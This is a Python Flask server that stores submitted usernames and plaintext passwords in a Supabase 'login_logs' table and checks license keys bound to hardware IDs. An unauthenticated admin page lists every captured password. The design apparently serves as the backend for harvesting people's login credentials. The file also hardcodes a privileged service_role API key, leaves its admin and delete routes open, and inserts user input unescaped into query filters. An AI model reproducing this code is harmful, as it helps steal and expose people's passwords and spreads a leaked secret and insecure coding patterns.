from flask import Flask, request, jsonify, render_template_string, redirect, url_for
from datetime import datetime
import requests

app = Flask(__name__)

SUPABASE_URL = "https://ldhdtghrvijamxhukcxu.supabase.co"
SUPABASE_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxkaGR0Z2hydmlqYW14aHVrY3h1Iiwicm9sZSI6InNlcnZpY2Vfcm9sZSIsImlhdCI6MTc1MTA3MzM1NCwiZXhwIjoyMDY2NjQ5MzU0fQ.a1GToBO0lVcNtIVWF4U05b7bWQaOOCgd_A23ijZsc7I"
HEADERS = {
    "apikey": SUPABASE_API_KEY,
    "Authorization": f"Bearer {SUPABASE_API_KEY}"
}

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background: #121212; color: #fff; padding: 20px; }
        h1 { color: #90caf9; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 10px; border: 1px solid #444; }
        th { background-color: #1e1e1e; }
        tr:nth-child(even) { background-color: #1a1a1a; }
        form { display: inline; }
        button { background-color: #e57373; border: none; padding: 5px 10px; color: #fff; cursor: pointer; border-radius: 4px; }
        button:hover { background-color: #ef5350; }
    </style>
</head>
<body>
    <h1>🔐 Admin Panel</h1>
    {% if records %}
        <table>
            <thead>
                <tr>
                    <th>#</th>
                    <th>Username</th>
                    <th>Password</th>
                    <th>Time</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody>
                {% for r in records %}
                <tr>
                    <td>{{ loop.index }}</td>
                    <td>{{ r.username }}</td>
                    <td>{{ r.password }}</td>
                    <td>{{ r.time }}</td>
                    <td>
                        <form method="POST" action="/delete/{{ r.id }}">
                            <button type="submit">Delete</button>
                        </form>
                    </td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    {% else %}
        <p>Không có log nào.</p>
    {% endif %}
</body>
</html>
'''

@app.route("/")
def home():
    return "✅ Server is running."

@app.route("/submit", methods=["POST"])
def submit():
    data = request.json
    if not isinstance(data, dict) or "user" not in data or "password" not in data:
        return jsonify({"status": "error", "message": "invalid payload"}), 400

    payload = {
        "username": data["user"],
        "password": data["password"],
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    r = requests.post(f"{SUPABASE_URL}/rest/v1/login_logs", headers={**HEADERS, "Content-Type": "application/json"}, json=payload)
    return jsonify({"status": "ok"})

@app.route("/admin", methods=["GET"])
def admin_panel():
    r = requests.get(f"{SUPABASE_URL}/rest/v1/login_logs?select=*", headers=HEADERS)
    return render_template_string(HTML_TEMPLATE, records=r.json())

@app.route("/delete/<int:log_id>", methods=["POST"])
def delete_entry(log_id):
    r = requests.delete(f"{SUPABASE_URL}/rest/v1/login_logs?id=eq.{log_id}", headers=HEADERS)
    return redirect(url_for('admin_panel'))

@app.route("/activate-key", methods=["POST"])
def activate_key():
    data = request.json
    key = data.get("key")
    hwid = data.get("hwid")
    mcuser = data.get("mcuser")

    if not key or not hwid or not mcuser:
        return "Missing required fields", 400

    check_used = requests.get(f"{SUPABASE_URL}/rest/v1/used_keys?key=eq.{key}", headers=HEADERS)
    if check_used.json():
        entry = check_used.json()[0]
        if entry["hwid"] == hwid and entry["used_by"] == mcuser:
            return jsonify({"status": "ok"})
        return jsonify({"status": "error", "message": "Key đã được sử dụng bởi thiết bị khác.", **entry}), 403

    check_license = requests.get(f"{SUPABASE_URL}/rest/v1/licenses?key=eq.{key}", headers=HEADERS)
    if not check_license.json():
        return jsonify({"status": "invalid", "message": "Key không tồn tại trong danh sách cấp phép."}), 403

    requests.delete(f"{SUPABASE_URL}/rest/v1/licenses?key=eq.{key}", headers=HEADERS)
    used_data = {
        "key": key,
        "used_by": mcuser,
        "hwid": hwid,
        "used_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    requests.post(f"{SUPABASE_URL}/rest/v1/used_keys", headers={**HEADERS, "Content-Type": "application/json"}, json=used_data)
    return jsonify({"status": "ok"})

@app.route("/check-key", methods=["POST"])
def check_key():
    data = request.json
    key = data.get("key")
    if not key:
        return jsonify({"status": "error", "message": "Thiếu key."}), 400

    check_license = requests.get(f"{SUPABASE_URL}/rest/v1/licenses?key=eq.{key}", headers=HEADERS)
    if check_license.json():
        return jsonify({"status": "available", "message": "Key hợp lệ và chưa được sử dụng."})

    check_used = requests.get(f"{SUPABASE_URL}/rest/v1/used_keys?key=eq.{key}", headers=HEADERS)
    if check_used.json():
        return jsonify({"status": "used", **check_used.json()[0]})

    return jsonify({"status": "invalid", "message": "Key không tồn tại."}), 404

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 8000))
    app.run(host="0.0.0.0", port=port)
